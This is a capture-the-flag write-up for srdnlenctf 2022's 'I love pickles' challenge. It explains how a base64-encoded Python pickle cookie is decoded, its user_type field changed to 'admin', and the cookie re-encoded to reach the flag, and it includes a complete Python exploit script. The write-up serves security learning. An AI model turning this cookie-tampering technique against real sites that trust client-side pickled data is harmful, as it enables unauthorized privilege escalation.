# srdnlenctf 2022

## I love pickles (X solves)

This challenge uses the pickle module to save the user permissions (anonymous or admin). We need to change the cookie to become "admin" and see the flag.

### Solution

To find the flag we have to change the cookie, which is a pickle of the class "User", we become aware of this class if we try to unpickle the cookie without having it defined. Then we can use Python introspection (dir) to see the attributes of the class, there is a "user_type" attribute that we need to change from "Anonymous" to "admin" as instructed in the website. Then we send the new pickled class and we can see the flag in the website.

### Exploit

```python
#!/bin/env python3

import requests
import logging
import os
import pickle
import base64
import re
logging.disable()

class User:
    pass

# Se challenge web
URL = os.environ.get("URL", "http://ilovepickles.challs.srdnlen.it")
URL = "http://localhost:8081"
session = requests.session()
r = session.get(URL)
user = r.cookies.get_dict()['userInfo']
user = pickle.loads(base64.b64decode(user))
user.user_type = "admin"
user = base64.b64encode(pickle.dumps(user))
user = user.decode("utf-8")

session.cookies.set('userInfo', None)
session.cookies.set('userInfo', user)

r = session.get(URL+"/flag")

flag = re.search("srdnlen{(.*)}", r.text).group(0)

print(flag)

```
